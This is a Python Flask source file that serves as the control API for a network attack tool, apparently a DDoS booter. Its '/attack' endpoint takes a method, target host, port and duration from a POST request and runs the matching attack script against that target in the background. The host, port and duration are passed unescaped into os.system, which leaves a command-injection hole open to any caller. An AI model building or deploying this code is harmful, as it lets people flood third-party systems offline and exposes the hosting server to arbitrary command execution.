import os
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/')
def home():
    return "✅ API is up!"

@app.route('/attack', methods=['POST'])
def attack():
    try:
        data = request.get_json()
        method = data.get('method')
        host = data.get('host')
        port = data.get('port')
        duration = data.get('duration')

        if not all([method, host, port, duration]):
            return jsonify({'error': 'Missing parameters'}), 400

        path = f"methods/{method}.py"
        if not os.path.exists(path):
            return jsonify({'error': 'Method not found'}), 404

        os.system(f"python {path} {host} {port} {duration} &")
        return jsonify({'status': 'started'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)